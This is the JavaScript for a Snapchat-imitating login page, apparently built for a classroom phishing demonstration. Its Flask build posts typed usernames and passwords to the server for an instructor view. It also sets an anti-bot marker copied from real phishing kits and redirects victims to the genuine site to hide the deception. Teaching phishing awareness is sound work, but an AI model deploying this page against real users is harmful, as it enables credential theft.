
//script of login.html file


function validatePassword(event) {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const incorrectMessage = document.querySelector('.incorrect');
    const usernameError = document.querySelector('.incorrect-username');

    // Client-side checks only — the server re-checks everything (never trust the browser).
    if (usernameInput.value.trim().length < 3) {
      usernameError.style.display = 'block';
      event.preventDefault();
      return false;
    }
    usernameError.style.display = 'none';

    if (passwordInput.value.length < 8) {
      incorrectMessage.style.display = 'block';  // Show error message
      event.preventDefault();  // Prevent form submission
      return false;
    }
    incorrectMessage.style.display = 'none';

    // Set the hidden anti-bot marker (real kits send these so naive crawlers
    // are skipped; the Flask build validates it server-side).
    document.getElementById('xrw').value = document.querySelector('form').dataset.xrw;

    // Two builds share this page; submit accordingly (see submitWithMode).
    submitWithMode(event);
    return false;
  }

  // Two builds, one login page:
  //   * Flask (local classroom): /api/mode answers -> POST /login so the
  //     server captures the submission (instructor view at /password).
  //   * Static (Netlify): /api/mode 404s -> browser-only. The typed values go
  //     into sessionStorage (this tab only) and the visitor is bounced
  //     straight to the genuine site — the "real phishing ending". Nothing is
  //     transmitted, stored or persisted anywhere.
  var submitting = false;

  function submitWithMode(event) {
    if (submitting) return false;   // ignore double-clicks while in flight
    submitting = true;
    event.preventDefault();
    fetch('/api/mode', { method: 'GET' })
      .then(function (res) {
        return res.text().then(function (body) {
          // Check the body, not just the status: a static host with a
          // catch-all/SPA rewrite could answer /api/mode with 200 HTML, which
          // would wrongly force the Flask branch and 404 on /login.
          if (body.trim() === 'flask') {
            event.target.submit();   // Flask build: native POST to /login
          } else {
            staticHandoff();
          }
        });
      })
      .catch(function () {
        // Probe failed. The page just loaded from this origin, so this is
        // almost always a static host (or file://) with no backend — run the
        // browser-only handoff. (On Flask this would only occur on a transient
        // fetch failure.)
        staticHandoff();
      });
    return false;
  }

  function staticHandoff() {
    // Stash the values so the reveal page (debrief.html) can be opened
    // manually for classroom debriefing — it is NOT part of the live flow.
    try {
      sessionStorage.setItem('phish_demo', JSON.stringify({
        username: document.getElementById('username').value.trim(),
        password: document.getElementById('password').value,
        time: new Date().toLocaleString()
      }));
    } catch (e) {
      // sessionStorage unavailable (private mode) — proceed without the reveal.
    }
    // The real phishing ending: straight to the genuine site, no reveal.
    window.location.href = 'https://www.snapchat.com/';
  }
  
  
  // Toggle password visibility with dynamic image for show/hide
  document.querySelector('.toggle-password').addEventListener('click', function () {
  const passwordField = document.getElementById('password');
  const eyeIcon = document.getElementById('eye-icon');
  
  if (passwordField.type === 'password') {
    passwordField.type = 'text';
    eyeIcon.src = 'img/eye-open.svg';  // Update to the open eye icon
  } else {
    passwordField.type = 'password';
    eyeIcon.src = 'img/eye-closed.svg';  // Update to the closed eye icon
  }
  });
  
  // Switch between username/email and phone number
  const switchToPhone = document.getElementById('switch-to-phone');
  const usernameInput = document.getElementById('username');
  const label = document.querySelector('label[for="username"]');
  
  switchToPhone.addEventListener('click', function () {
  if (label.textContent === 'USERNAME OR EMAIL') {
    label.textContent = 'PHONE NUMBER';
    usernameInput.type = 'tel';
  
    switchToPhone.textContent = 'Use email instead';
  } else {
    label.textContent = 'USERNAME OR EMAIL';
    usernameInput.type = 'text';
  
    switchToPhone.textContent = 'Use phone number instead';
  }
  });


  window.onload = function() {
    var errorMessage = document.getElementById('error-message');
    if (!errorMessage) return;

    // The Flask build redirects rejected submissions back with ?error=1.
    // The static build never sets it, so the banner stays hidden there.
    if (new URLSearchParams(window.location.search).has('error')) {
      errorMessage.style.display = 'block';

      // Hide the error message after the user clicks anywhere on the page
      document.body.addEventListener('click', function() {
        errorMessage.style.display = 'none';
      });
    }
  };
  
  